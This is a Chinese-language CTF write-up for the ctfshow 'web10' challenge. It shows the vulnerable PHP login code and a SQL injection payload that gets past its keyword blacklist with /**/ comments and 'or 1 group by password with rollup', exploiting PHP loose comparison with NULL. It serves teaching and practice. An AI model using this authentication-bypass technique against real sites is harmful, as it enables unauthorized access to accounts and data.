---
tags:
  - 题目
  - CTF
  - ctfshow
---
[web10](https://ctf.show/challenges#web10-17)

点取消可获得源码
```php
<?php
$flag = "";
function replaceSpecialChar($strParam)
{
    $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
    return preg_replace($regex, "", $strParam);
}
if (!$con) {
    die("Could not connect: " . mysqli_error());
}
if (strlen($username) != strlen(replaceSpecialChar($username))) {
    die("sql inject error");
}
if (strlen($password) != strlen(replaceSpecialChar($password))) {
    die("sql inject error");
}
$sql = "select * from user where username = '$username'";
$result = mysqli_query($con, $sql);
if (mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        if ($password == $row["password"]) {
            echo "登陆成功<br>";
            echo $flag;
        }
    }
}
?>

```

显然万能密码无法登录，考虑伪造数据。

`union select` 被ban了，这条路行不通

`WITH ROLLUP` 是用来在 `group by` 查出来的数据多加一行数据，也就是汇总用的。

### Payload 构造

由于数据库中不存在 `admin` 账户，我们需要通过 `or 1` 使得 `WHERE` 子句恒成立，从而选中表中的其他现有用户，并以此为基础进行 `ROLLUP` 汇总。

* **Username**: `'/**/or/**/1/**/group/**/by/**/password/**/with/**/rollup/**/#`
* **Password**: `(留空)`

*(注：由于关键字过滤，使用 `/**/` 代替空格，使用 `or` 代替被禁用的 `and`)*

---

### SQL 查询结果对比

假设数据库 `user` 表中虽然没有 `admin`，但存在其他用户（如 `test` 和 `guest`）：

#### 1. 不加 GROUP BY (选中所有用户)
```sql
select * from user where username = '' or 1;
```

| id  | username | password  |
| :-- | :------- | :-------- |
| 1   | test     | abc123456 |
| 2   | guest    | guest888  |

#### 2. 仅增加 GROUP BY
```sql
select * from user where username = '' or 1 group by password;
```

| id | username | password |
| :--- | :--- | :--- |
| 1 | test | abc123456 |
| 2 | guest | guest888 |

#### 3. 增加 WITH ROLLUP (注入后)
```sql
select * from user where username = '' or 1 group by password with rollup;
```

| id    | username  | password  |
| :---- | :-------- | :-------- |
| 1     | test      | abc123456 |
| 2     | guest     | guest888  |
| **2** | **guest** | **NULL**  |

---

### 为什么会出现 NULL？

`WITH ROLLUP` 的核心作用是在分组查询的最后生成一行“超级聚合”记录。

1.  **汇总机制**：当 SQL 执行 `GROUP BY password WITH ROLLUP` 时，它会遍历所有已经分好的组（此处为 `test` 组和 `guest` 组）。在显示完所有组的结果后，它会额外生成一行用于展示**全表汇总**的数据。
2.  **占位符 NULL**：对于汇总行来说，它代表的是“所有密码的统计”，因此无法对应具体的某一个密码。在 MySQL 的实现中，**分组依据的列（即 `password` 字段）在汇总行会被自动填充为 `NULL`**。
3.  **绕过成功的原因**：
    * 程序通过 `while` 循环读取结果集，前两行真实用户的数据因为密码不匹配（`"" == "abc123456"` 为 False）被跳过。
    * 当循环到最后一行（汇总行）时，`$row["password"]` 的值为 `NULL`。
    * PHP 的弱类型比较 `"" == NULL` 判定为 **True**，程序进入 `if` 分支，成功输出 Flag。